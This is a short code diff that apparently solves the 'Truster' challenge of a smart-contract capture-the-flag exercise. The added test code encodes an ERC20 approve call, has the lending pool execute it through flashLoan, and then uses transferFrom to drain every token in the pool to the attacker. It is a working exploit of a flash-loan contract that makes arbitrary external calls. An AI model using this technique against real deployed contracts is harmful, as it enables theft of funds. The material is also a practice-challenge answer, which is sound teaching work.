@@ -28,7 +28,17 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        // Function call signature of `approve` of erc20
+        const data = this.token.interface.encodeFunctionData(
+            "approve",
+            [attacker.address, TOKENS_IN_POOL]
+        );
+
+        // Make the pool approve allowance of all tokens to attacker
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);
+
+        // Transfer all approved tokens to attacker
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
